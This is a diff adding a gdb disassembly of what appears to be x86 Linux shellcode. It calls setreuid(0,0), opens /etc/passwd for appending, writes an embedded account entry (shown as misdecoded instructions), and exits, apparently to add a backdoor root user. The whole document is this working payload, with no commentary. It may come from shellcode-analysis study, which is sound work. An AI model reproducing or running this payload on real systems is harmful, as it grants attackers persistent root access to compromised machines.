@@ -1,0 +1,44 @@
+Dump of assembler code for function code:
+=> 0x0804c040 <+0>:	xor    ecx,ecx
+   0x0804c042 <+2>:	mov    ebx,ecx
+   0x0804c044 <+4>:	push   0x46
+   0x0804c046 <+6>:	pop    eax
+   0x0804c047 <+7>:	int    0x80
+   0x0804c049 <+9>:	push   0x5
+   0x0804c04b <+11>:	pop    eax
+   0x0804c04c <+12>:	xor    ecx,ecx
+   0x0804c04e <+14>:	push   ecx
+   0x0804c04f <+15>:	push   0x64777373
+   0x0804c054 <+20>:	push   0x61702f2f
+   0x0804c059 <+25>:	push   0x6374652f
+   0x0804c05e <+30>:	mov    ebx,esp
+   0x0804c060 <+32>:	inc    ecx
+   0x0804c061 <+33>:	mov    ch,0x4
+   0x0804c063 <+35>:	int    0x80
+   0x0804c065 <+37>:	xchg   ebx,eax
+   0x0804c066 <+38>:	call   0x804c08e <code+78>
+   0x0804c06b <+43>:	jne    0x804c0e0
+   0x0804c06d <+45>:	gs jb  0x804c0a1
+   0x0804c070 <+48>:	cmp    al,BYTE PTR [ecx+0x7a]
+   0x0804c073 <+51>:	push   ebx
+   0x0804c074 <+52>:	jp     0x804c0b8
+   0x0804c076 <+54>:	xor    dh,BYTE PTR [ebp+0x79]
+   0x0804c079 <+57>:	cmp    BYTE PTR [edx+0x46],cl
+   0x0804c07c <+60>:	ins    BYTE PTR es:[edi],dx
+   0x0804c07d <+61>:	imul   edi,DWORD PTR [edx],0x30
+   0x0804c080 <+64>:	cmp    dh,BYTE PTR [eax]
+   0x0804c082 <+66>:	cmp    bh,BYTE PTR [edx]
+   0x0804c084 <+68>:	das    
+   0x0804c085 <+69>:	cmp    ch,BYTE PTR [edi]
+   0x0804c087 <+71>:	bound  ebp,QWORD PTR [ecx+0x6e]
+   0x0804c08a <+74>:	das    
+   0x0804c08b <+75>:	jae    0x804c0f5
+   0x0804c08d <+77>:	or     bl,BYTE PTR [ecx-0x75]
+   0x0804c090 <+80>:	push   ecx
+   0x0804c091 <+81>:	cld    
+   0x0804c092 <+82>:	push   0x4
+   0x0804c094 <+84>:	pop    eax
+   0x0804c095 <+85>:	int    0x80
+   0x0804c097 <+87>:	push   0x1
+   0x0804c099 <+89>:	pop    eax
+   0x0804c09a <+90>:	int    0x80
